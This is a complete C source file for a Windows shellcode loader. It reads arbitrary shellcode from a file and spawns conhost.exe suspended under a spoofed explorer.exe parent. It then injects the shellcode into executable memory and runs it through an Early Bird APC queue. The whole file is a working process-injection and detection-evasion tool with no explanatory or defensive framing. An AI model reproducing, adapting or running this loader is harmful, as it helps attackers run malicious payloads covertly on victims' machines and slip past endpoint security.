#include <windows.h>
#include <stdio.h>

#include "..\includes\utils.h"              //  crt replacements

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <shellcode>\n", argv[0]);
        return -1;
    }

    // Read Shellcode from File
    const char* fileName = argv[1];
    HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open shellcode file: %d\n", GetLastError());
        return -1;
    }

    DWORD shellcodeSize = GetFileSize(hFile, NULL);
    unsigned char* shellcodeBuffer = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, shellcodeSize);
    
    DWORD bytesRead;
    if (!ReadFile(hFile, shellcodeBuffer, shellcodeSize, &bytesRead, NULL)) {
        printf("[!] Failed to read file content.\n");
        return -1;
    }
    CloseHandle(hFile);
    printf("[+] Read %d bytes of shellcode from %s\n", shellcodeSize, fileName);

    // Setup PPID Spoofing
    STARTUPINFOEXA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize = 0;

    DWORD parentPid = GetExplorerPID();
    if (parentPid == 0) return -1;

    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
    if (!hParent) {
        printf("[!] Failed to open Explorer handle: %d\n", GetLastError());
        return -1;
    }

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

    // Spawn conhost.exe & Inject
    char cmd[] = "C:\\Windows\\System32\\conhost.exe";
    
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi)) {
        printf("[!] CreateProcess failed: %d\n", GetLastError());
        return -1;
    }

    printf("[+] conhost.exe spawned (PID: %d) spoofing Explorer (%d)\n", pi.dwProcessId, parentPid);

    // Allocate memory in target
    LPVOID lpBaseAddress = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpBaseAddress) {
        WriteProcessMemory(pi.hProcess, lpBaseAddress, shellcodeBuffer, shellcodeSize, NULL);
        
        // Queue the Early Bird APC
        QueueUserAPC((PAPCFUNC)lpBaseAddress, pi.hThread, (ULONG_PTR)lpBaseAddress);
        
        printf("[+] Shellcode queued. Resuming thread...\n");
        ResumeThread(pi.hThread);
    }

    // Cleanup
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, shellcodeBuffer);
    CloseHandle(hParent);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}